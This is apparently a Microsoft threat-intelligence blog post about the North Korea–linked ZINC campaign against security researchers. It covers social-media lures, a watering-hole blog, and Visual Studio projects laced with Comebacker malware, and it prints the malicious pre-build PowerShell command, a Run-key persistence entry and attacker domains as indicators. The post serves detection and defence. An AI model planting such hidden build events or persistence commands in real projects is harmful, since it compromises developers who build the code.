ZINC attacks against security researchers
microsoft.com/security/blog/2021/01/28/zinc-attacks-against-security-researchers/
January 28, 2021

In recent months, Microsoft has detected cyberattacks targeting security researchers by an
actor we track as ZINC. The campaign originally came to our attention after Microsoft
Defender for Endpoint detected an attack in progress. Observed targeting includes pen
testers, private offensive security researchers, and employees at security and tech
companies. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high
confidence to ZINC, a DPRK-affiliated and state-sponsored group, based on observed
tradecraft, infrastructure, malware patterns, and account affiliations.
This ongoing campaign was reported by Google’s Threat Analysis Group (TAG) earlier this
week, capturing the browser-facing impact of this attack. By sharing additional details of the
attack, we hope to raise awareness in the cybersecurity community about additional
techniques used in this campaign and serve as a reminder to security professionals that they
are high-value targets for attackers.
We also want to thank our industry colleagues at Twitter and GitHub for their collaboration in
this investigation and rapid actions to suspend the malicious accounts targeting the security
community and our mutual customers.

We are sharing this information with the community as part of our mission to shine a light on
bad actors and elevate awareness of low-profile tactics and techniques that easily fly under
the radar of security operations centers (SOCs) or security professionals and are easily
overlooked as low-level alerts or benign chatter. The related IoCs and Microsoft Defender for
Endpoint product detections we share in this blog will help SOCs proactively hunt for related
activity in their environments and elevate any low-level alerts for remediation. ZINC used a
variety of new techniques to target the victims, including gaining credibility on social media
with genuine content, sending malicious Visual Studio projects, and using a watering hole
website weaponized with browser exploits.

Technical details
In mid-2020, ZINC started building a reputation in the security research community on Twitter
by retweeting high quality security content and posting about exploit research from an actorcontrolled blog. Throughout the lifetime of the campaign, the actor operated several accounts
that accounted for roughly 2,000 followers, including many prominent security researchers.
In the image below, one of the actor-controlled Twitter account retweets another of their
accounts to amplify their own posts. The posts from the actors received a reasonable
amount of attention, usually accumulating several hundred likes or retweets.

After building their reputation across their established social media accounts, the actors
started approaching potential targets on social media platforms such as Twitter and LinkedIn.
The conversations were often seemingly innocuous, asking security questions or talking
about exploit techniques. If the researcher was responsive, the actor would offer to move
communication to another platform (e.g., email, Discord) in some cases to then send files
using encrypted or PGP protected ZIPs.
ZINC also used their Twitter accounts to post links to a security blog they owned
(br0vvnn[.]io). These links were also shared by many others in the security community on
Twitter and other social media platforms, further deepening trust for the owner and content.
A blog post titled DOS2RCE: A New Technique To Exploit V8 NULL Pointer Dereference
Bug, was shared by the actor on October 14, 2020 from Twitter. From October 19-21, 2020,
some researchers, who hadn’t been contacted or sent any files by ZINC profiles, clicked the
links while using the Chrome browser, resulting in known ZINC malware on their machines
soon after. This suggests that a Chrome browser exploit chain was likely hosted on the blog,
although we haven’t been able to prove this. Since some of the victim’s browsers were fully
patched, it’s also suspected, but unproven, that the exploit chain used 0-day or patch gap
exploits. We believe that not all visitors to the site were compromised, even during the dates
listed above.

Malicious Visual Studio project
Some of the files sent by ZINC to researchers were malicious Visual Studio projects that
included prebuilt binaries. One of the binaries used the well-known name Browse.vc.db but
was a malicious DLL rather than a database file. Microsoft Defender for Endpoint detects
these DLLs as Comebacker malware. A pre-build event with a PowerShell command was
used to launch Comebacker via rundll32. This use of a malicious pre-build event is an
innovative technique to gain execution.
An example of the PowerShell in the pre-build event can be seen here:
<PreBuildEvent>
<Command>
powershell -executionpolicy bypass -windowstyle hidden
if(([system.environment]::osversion.version.major -eq 10) -and
[system.environment]::is64bitoperatingsystem -and (Test-Path x64\Debug\Browse.VC.db))
{rundll32 x64\Debug\Browse.VC.db,ENGINE_get_RAND 7am1cKZAEb9Nl1pL 4201 }
</Command>
</PreBuildEvent>

3/15

Pre-build events are stored in the .vcxproj file in Visual Studio solutions. The page How to:
Use Build Events in MSBuild Projects has a list of other build events and example XML for
the events. It would also be possible to abuse a custom build step in the same way.

Analyzing Comebacker DLLs
Once the malicious Visual Studio Project file was built, the process drops
C:\ProgramData\VirtualBox\update.bin and adds the file to an autostart registry key.
Update.bin (SHA-256: 25d8ae46…) is a different 64-bit DLL file embedded inside
Browser.VC.db.
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SSL Update
“C:\Windows\System32\rundll32.exe
C:\ProgramData\VirtualBox\update.bin,ASN2_TYPE_new 5I9YjCZ0xlV45Ui8 2907”
The actors put some effort into modifying the Comebacker malware attributes between
deployments; file names, file paths and exported functions were regularly changed so these
static IOCs can’t be solely relied upon for dependable detection. We were first alerted to the
attack when Microsoft Defender for Endpoint detected the Comebacker DLL attempting to
perform process privilege escalation. See the Microsoft Defender for Endpoint detections
section for a full process chain of the attack.

Klackring malware
Klackring is a DLL that registers a malicious service on the targeted machine. It was
deployed to victims either by the Comebacker malware or an unknown dropper. The DLL
was dropped to C:\Windows\system32 and saved with the .sys file extension.

MHTML file
In addition to the social engineering attacks via social media platforms, we observed that
ZINC sent researchers a copy of a br0vvnn blog page saved as an MHTML file with
instructions to open it with Internet Explorer. The MHTML file contained some obfuscated
JavaScript that called out to a ZINC-controlled domain for further JavaScript to execute. The
site was down at the time of investigation and we have not been able to retrieve the payload
for further analysis.

Driver abuse
In one instance, we discovered the actor had downloaded an old version of the Viraglt64.sys
driver from the Vir.IT eXplorer antivirus. The file was dropped to the victim system as
C:\Windows\System32\drivers\circlassio.sys. The actor then attempted to exploit CVE-201716238, described by the finder here, where the driver doesn’t perform adequate checking on
a buffer it receives, which can be abused to gain an arbitrary kernel write primitive. The

4/15

actor’s code however appears to be buggy and when attempting to exploit the vulnerability
the exploit tried to overwrite some of the driver’s own code which crashed the victim’s
machine.

Other malware
Other tools used included an encrypted Chrome password-stealer hosted on ZINC domain
https://codevexillium[.]org. The host DLL (SHA-256: ada7e80c…) was downloaded to the
path C:\ProgramData\USOShared\USOShared.bin using PowerShell and then ran via
rundll32. This malware is a weaponized version of CryptLib, and it decrypted the Chrome
password stealer (SHA-256: 9fd0506…), which it dropped to
C:\ProgramData\USOShared\USOShared.dat.

C2 communication
After establishing a command-and-control (C2) channel on a targeted device, the backdoor
is configured to check into the C2 servers every 60 seconds. Over this C2 channel, the threat
actors can execute remote commands to enumerate files/directories and running processes,
and to collect/upload information about the target device, including IP address, Computer
Name, and NetBIOS. Furthermore, we observed some hands-on-keyboard action to
enumerate all files/directories on the target disk, create screenshots, and deploy additional
modules.

Microsoft Defender for Endpoint detections
When malware is run from a malicious Visual Studio project, the following alerts and process
tree are generated by Microsoft Defender for Endpoint. Multiple alerts, including “Use of
living-off-land binary to run malware” and “Process Privilege escalation”, were triggered on
the execution of Browser.VC.db and update.bin.
Microsoft Defender for Endpoint has comprehensive detection coverage for this campaign.
These detections raise alerts that inform security operations teams about the presence of
activities and artifact from the attacks. Security operations and incident response teams can
use investigation and remediation tools in Microsoft Defender Endpoint to perform deep
investigation and additional hunting.

Recommended actions and preventative measures
If you visited the referenced ZINC-owned blog (br0vvnn[.]io), you should immediately run a
full antimalware scan and use the provided IOCs to check your systems for intrusion. If a
scan or searching for the IOCs find any related malware on your systems, you should
assume full compromise and rebuild. Microsoft assesses that security research was the likely
objective of the attack, and any information on the affected machine may be compromised.
For proactive prevention of this type of attack, it is recommended that security professionals
use an isolated environment (e.g., a virtual machine) for building untrusted projects in Visual
Studio or opening any links or files sent by unknown parties.

Associated indicators of compromise (IOCs)
The below list provides IOCs observed during this activity. We encourage our customers to
implement detections and protections to identify possible prior campaigns or prevent future
campaigns against their systems.
Azure Sentinel customers can find a Sentinel query containing these indicators in this GitHub
repo: https://github.com/Azure/AzureSentinel/tree/master/Detections/MultipleDataSources/ZincJan272021IOCs.yaml
